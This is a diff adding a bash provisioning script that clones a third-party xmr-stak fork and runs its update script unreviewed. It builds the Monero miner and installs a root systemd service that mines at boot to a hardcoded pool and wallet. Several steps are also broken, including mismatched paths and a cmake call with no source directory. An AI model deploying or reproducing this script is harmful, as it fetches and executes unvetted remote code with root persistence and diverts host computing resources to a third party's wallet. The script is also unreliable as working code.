@@ -1,0 +1,39 @@
+#!/bin/bash -ex 
+apt-get update -y 
+sudo -s 
+cd /home/ubuntu 
+apt-get install git
+git clone https://github.com/Enimus/xmr-stak.git 
+chmod +x /xmr-stak/enimus-update.sh 
+/xmr-stak/enimus-update.sh 
+cmake -DCUDA_ENABLE=OFF -DHWLOC_ENABLE=OFF -DOpenCL_ENABLE=OFF 
+make install 
+cd bin/ 
+chmod +x bin/xmr-stak 
+chown -R ubuntu:ubuntu /home/ubuntu/* 
+sysctl -w vm.nr_hugepages=128 
+echo -e "vm.nr_hugepages=128" | tee -a /etc/sysctl.conf 
+cat > /lib/systemd/system/xmr.service  << EOF
+[Unit] 
+Description=xmr 
+After=network.target 
+[Service] 
+ExecStart=/home/ubuntu/xmr-stak/bin/xmr-stak -c /home/ubuntu/xmr-stak/bin/config.txt --url "pool.supportxmr.com:3333" --user "42VF7s3ntNjAwhd36P2VQYgfmg5PC32WRN1nGskr8aqudBS3DH6oxAMBVNSC3aWwM21Y49mMxzzJVjUBKUgtq9T6PoVnvDL" --pass "Enimus:enimus@enimus.com" --rigid "" --httpd "0" --currency "monero7" 
+User=root 
+[Install] 
+WantedBy=multi-user.target 
+EOF
+ 
+systemctl daemon-reload 
+systemctl enable xmr.service 
+systemctl start xmr.service 
+systemctl stop xmr.service 
+systemctl restart xmr.service 
+ 
+  
+ 
+
+
+
+
+
